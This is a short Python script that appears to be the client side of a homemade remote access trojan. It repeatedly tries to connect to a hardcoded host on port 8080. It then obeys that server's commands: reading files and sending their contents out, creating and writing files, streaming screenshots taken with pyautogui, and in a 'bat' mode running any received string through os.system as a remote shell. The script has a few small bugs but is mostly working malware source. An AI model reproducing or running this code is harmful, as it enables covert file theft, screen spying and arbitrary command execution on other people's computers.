import os
import socket
import pyautogui
import time
 
#127.0.0.1
#10.68.72.124
#10.81.68.126
s = socket.socket()
port = 8080
host = "10.81.68.126"
connected = False
while not connected:
    try:
        s.connect((host,port))
        connected = True
    except:
        pass

#"10.81.68.126"
#192.168.100.7
while 1:
    command = s.recv(1024)
    command = command.decode()
    if command == "make file":
        command = s.recv(1024)
        command == command.decode()
        f = open(command,"x")
    if command == "read file":
        command = s.recv(1024)
        command = command.decode()
        f = open(command, "r")
        if f.mode == "r":
            content = f.read()
            s.send(content.encode())
    if command == "write file":
        command = s.recv(1024)
        command = command.decode()
        f = open(command, "w")
        if f.mode == "w":
            content = s.recv(8640).decode()
            f.write(content)
    if command == "stream":
        s.send(command.encode())
        run = True
        print("\n stream")
        answer = ""
        timeouttimer = 0
        while run:
            s.settimeout(10)
            try:
                answer = s.recv(5000).decode()
            except:
                print("annswer timed out")
                timeouttimer += 1
            if timeouttimer == 300:
                run = False
                timeouttimer = 0
            if answer == "send size":
                try:
                    screenshot = pyautogui.screenshot()
                    print("taken screenshot")
                    screenshot.save(os.getcwd() + "imagee.png")
                    image = os.getcwd() + "imagee.png"
                    print("saved file")
                    myfile = open(image, 'rb')
                    print("opend file")
                    bytes = myfile.read()
                    print("read file")
                    size = len(bytes)
                    print(size)
                    s.send(str(size).encode())
                    print("sendt size")
                    answer = ""
                    timeouittimer = 0 
                except:
                    print("somthing went wrong")
            elif answer != "send size":
                try:
                    if int(answer) == size:
                        s.send(bytes)
                    else:
                        print("not write size, to send image")
                except:
                    print("could not int the answer")
    elif command == "bat":
        run = True
        while run:
            user_command = s.recv(5000)
            user_command = user_command.decode()
            if user_command == "kill":
                run = False
            else:
                os.system(user_command)
       
                        
